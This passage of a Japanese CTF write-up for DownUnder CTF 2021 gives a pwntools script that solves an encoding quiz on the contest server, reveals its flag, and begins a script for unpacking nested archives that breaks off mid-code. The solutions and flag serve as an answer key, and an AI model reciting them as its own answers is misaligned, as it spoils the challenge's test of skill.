@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>DownUnder CTF 2021 Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://play.duc.tf/challenges 1410点を獲得し、372位でした。 チャレンジのリストです。 [Misc]: General Skills Quiz (100 points) Challenge QUIZ TIME! Just answer the questions. Pretty easy right? nc pwn-2021.duc.tf 31905 Solution 書いたコー" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.74.2 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/downunder_ctf_2021/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="DownUnder CTF 2021 Writeup" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://play.duc.tf/challenges 1410点を獲得し、372位でした。 チャレンジのリストです。 [Misc]: General Skills Quiz (100 points) Challenge QUIZ TIME! Just answer the questions. Pretty easy right? nc pwn-2021.duc.tf 31905 Solution 書いたコー" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/downunder_ctf_2021/" />
+<meta property="article:published_time" content="2021-09-26T22:00:00+09:00" />
+<meta property="article:modified_time" content="2021-09-26T22:00:00+09:00" />
+<meta itemprop="name" content="DownUnder CTF 2021 Writeup">
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://play.duc.tf/challenges 1410点を獲得し、372位でした。 チャレンジのリストです。 [Misc]: General Skills Quiz (100 points) Challenge QUIZ TIME! Just answer the questions. Pretty easy right? nc pwn-2021.duc.tf 31905 Solution 書いたコー">
+<meta itemprop="datePublished" content="2021-09-26T22:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2021-09-26T22:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="2214">
+
+
+
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="DownUnder CTF 2021 Writeup"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://play.duc.tf/challenges 1410点を獲得し、372位でした。 チャレンジのリストです。 [Misc]: General Skills Quiz (100 points) Challenge QUIZ TIME! Just answer the questions. Pretty easy right? nc pwn-2021.duc.tf 31905 Solution 書いたコー"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">DownUnder CTF 2021 Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-09-26 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#misc-general-skills-quiz-100-points">[Misc]: General Skills Quiz (100 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-rabbit-100-points">[Misc]: rabbit (100 points)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-thats-not-my-name-100-points">[Forensics]: That&rsquo;s Not My Name (100 points)</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-deadcode-100-points">[Pwn]: deadcode (100 points)</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-get-over-it-100-points">[OSINT]: Get over it! (100 points)</a>
+      <ul>
+        <li><a href="#challenge-4">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
+<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fcybrics_ctf_2021%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://play.duc.tf/challenges">https://play.duc.tf/challenges</a>
+<br /><br /></p>
+<p>1410点を獲得し、372位でした。</p>
+<p><br><br></p>
+<img src="https://captureamerica.github.io/writeups/img/downunder_CTF_2021_Score1.png" alt="downunder_CTF_2021_Score1.png">
+<br>
+<img src="https://captureamerica.github.io/writeups/img/downunder_CTF_2021_Score2.png" alt="downunder_CTF_2021_Score2.png">
+<p><br><br>
+チャレンジのリストです。</p>
+<img src="https://captureamerica.github.io/writeups/img/downunder_CTF_2021_chall1.png" alt="downunder_CTF_2021_chall1.png">
+<br>
+<img src="https://captureamerica.github.io/writeups/img/downunder_CTF_2021_chall2.png" alt="downunder_CTF_2021_chall2.png">
+<br>
+<img src="https://captureamerica.github.io/writeups/img/downunder_CTF_2021_chall3.png" alt="downunder_CTF_2021_chall3.png">
+<br>
+<p><br /><br /></p>
+<h2 id="misc-general-skills-quiz-100-points">[Misc]: General Skills Quiz (100 points)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>QUIZ TIME! Just answer the questions. Pretty easy right?
+<br /><br />
+nc pwn-2021.duc.tf 31905</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution">Solution</h3>
+<p>書いたコード。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="hl"><span class="lnt">16
+</span></span><span class="hl"><span class="lnt">17
+</span></span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#!/usr/bin/env python</span>
+<span class="c">#-*- coding:utf-8 -*-</span>
+<span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="p">*</span>
+<span class="n">from</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span> <span class="n">import</span> <span class="n">unquote</span>
+<span class="n">import</span> <span class="n">base64</span>
+<span class="n">import</span> <span class="n">codecs</span>
+
+<span class="n">s</span> <span class="p">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn-2021.duc.tf&#39;</span><span class="p">,</span> <span class="n">31905</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">b</span><span class="s2">&#34;Press enter when you are ready to start your 30 seconds timer for the quiz...&#34;</span><span class="p">,</span> <span class="n">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">b</span><span class="s2">&#34;Answer this maths question: 1+1=?\n&#34;</span><span class="p">,</span> <span class="n">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">b</span><span class="s2">&#34;Decode this hex string and provide me the original number (base 10): &#34;</span><span class="p">)</span>
+<span class="n">msg</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="err">:</span><span class="p">-</span><span class="n">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+<span class="n">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+<span class="hl"><span class="c"># s.sendline(str(int(msg,16)))</span>
+</span><span class="hl"><span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">bytes</span><span class="p">(</span><span class="n">str</span><span class="p">(</span><span class="n">int</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span><span class="n">16</span><span class="p">)),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">b</span><span class="s2">&#34;Decode this hex string and provide me the original ASCII letter: &#34;</span><span class="p">)</span>
+<span class="n">msg</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="err">:</span><span class="p">-</span><span class="n">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+<span class="n">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">bytes</span><span class="p">(</span><span class="n">chr</span><span class="p">(</span><span class="n">int</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span><span class="n">16</span><span class="p">)),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">b</span><span class="s2">&#34;Decode this URL encoded string and provide me the original ASCII symbols: &#34;</span><span class="p">)</span>
+<span class="n">msg</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="err">:</span><span class="p">-</span><span class="n">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+<span class="n">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">bytes</span><span class="p">(</span><span class="n">unquote</span><span class="p">(</span><span class="n">msg</span><span class="p">),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">b</span><span class="s2">&#34;Decode this base64 string and provide me the plaintext: &#34;</span><span class="p">)</span>
+<span class="n">msg</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="err">:</span><span class="p">-</span><span class="n">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+<span class="n">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">b</span><span class="s2">&#34;Encode this plaintext string and provide me the Base64: &#34;</span><span class="p">)</span>
+<span class="n">msg</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="err">:</span><span class="p">-</span><span class="n">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+<span class="n">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">bytes</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="s1">&#39;ascii&#39;</span><span class="p">)))</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">b</span><span class="s2">&#34;Decode this rot13 string and provide me the plaintext: &#34;</span><span class="p">)</span>
+<span class="n">msg</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="err">:</span><span class="p">-</span><span class="n">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+<span class="n">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">bytes</span><span class="p">(</span><span class="n">codecs</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="s1">&#39;rot13&#39;</span><span class="p">),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">b</span><span class="s2">&#34;Encode this plaintext string and provide me the ROT13 equilavent: &#34;</span><span class="p">)</span>
+<span class="n">msg</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="err">:</span><span class="p">-</span><span class="n">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+<span class="n">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">bytes</span><span class="p">(</span><span class="n">codecs</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="s1">&#39;rot13&#39;</span><span class="p">),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">b</span><span class="s2">&#34;Decode this binary string and provide me the original number (base 10): &#34;</span><span class="p">)</span>
+<span class="n">msg</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="n">2</span><span class="err">:</span><span class="p">-</span><span class="n">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+<span class="n">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">bytes</span><span class="p">(</span><span class="n">str</span><span class="p">(</span><span class="n">int</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span><span class="n">2</span><span class="p">)),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">b</span><span class="s2">&#34;Encode this number and provide me the binary equivalent: &#34;</span><span class="p">)</span>
+<span class="n">msg</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="err">:</span><span class="p">-</span><span class="n">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+<span class="n">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">bytes</span><span class="p">(</span><span class="n">bin</span><span class="p">(</span><span class="n">int</span><span class="p">(</span><span class="n">msg</span><span class="p">)),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">b</span><span class="s2">&#34;Final Question, what is the best CTF competition in the universe?&#34;</span><span class="p">,</span> <span class="n">b</span><span class="s2">&#34;DUCTF&#34;</span><span class="p">)</span>
+
+<span class="n">msg</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvall</span><span class="p">()</span>
+<span class="n">print</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br />
+ハイライト部分で、以下のWarning対策をしてます。</p>
+<pre>
+./General_Skills_Quiz_solve.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.sendline(str(int(msg,16)))
+</pre>
+<p><br /></p>
+<p>Flag: <code>DUCTF{you_aced_the_quiz!_have_a_gold_star_champion}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="misc-rabbit-100-points">[Misc]: rabbit (100 points)</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>Can you find Babushka&rsquo;s missing vodka? It&rsquo;s buried pretty deep, like 1000 steps, deep.
+<br /><br /></p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>flag.txt</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-1">Solution</h3>
+<p>flag.txtは、bzip2で圧縮されたファイルでした。</p>
+<pre>
+$ file flag.txt
+flag.txt: bzip2 compressed data, block size = 900k
+</pre>
+<p><br /></p>
+<p>一度解凍してみると、次に7zで圧縮されたファイルが出てきたので、繰り返し解凍を行うチャレンジのようです。</p>
+<p>これは、<a href="https://captureamerica.github.io/writeups/post/sarctf_2020/#misc-deep-dive">SarCTF by Saratov State University 2020 の Deep dive</a> というチャレンジで過去にやってます。</p>
+<p>SarCTFのWriteupの時にはコードは載せなかったんですが（あんまり良いSolutionじゃなかったので）、今回は載せちゃおうかと思います。</p>
+<p>VMで動かしているUbuntuだと、うまくいかなかったので、Mac上で動かしました（Python2）。これでもいちおう解けるんですが、途中で1、2回止まったりしてたので、あんまりオススメじゃありません。。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># Usage:</span>
+<span class="c1"># watch -n 1 &#34;./rabbit_solve.py flag.txt&#34;</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+
+<span class="n">filename</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;file &#34;</span> <span class="o">+</span> <span class="n">filename</span>
+<span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">fout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="s2">&#34;POSIX tar archive&#34;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+    <span class="n">filename2</span> <span class="o">=</span> <span class="n">filename</span> <span class="o">+</span> <span class="s2">&#34;.tar&#34;</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;mv &#34;</span> <span class="o">+</span> <span class="n">filename</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="n">filename2</span>
+    <span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;tar xvf &#34;</span> <span class="o">+</span> <span class="n">filename2</span>
+    <span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="s2">&#34;Zip archive data&#34;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+    <span class="n">filename2</span> <span class="o">=</span> <span class="n">filename</span> <span class="o">+</span> <span class="s2">&#34;.zip&#34;</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;mv &#34;</span> <span class="o">+</span> <span class="n">filename</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="n">filename2</span>
+    <span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;unzip &#34;</span> <span class="o">+</span> <span class="n">filename2</span>
+    <span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="s2">&#34;bzip2 compressed data&#34;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+    <span class="n">filename2</span> <span class="o">=</span> <span class="n">filename</span> <span class="o">+</span> <span class="s2">&#34;.bz2&#34;</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;mv &#34;</span> <span class="o">+</span> <span class="n">filename</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="n">filename2</span>
+    <span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;bzip2 -d &#34;</span> <span class="o">+</span> <span class="n">filename2</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">fout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;touch &#34;</span> <span class="o">+</span> <span class="n">filename2</span>
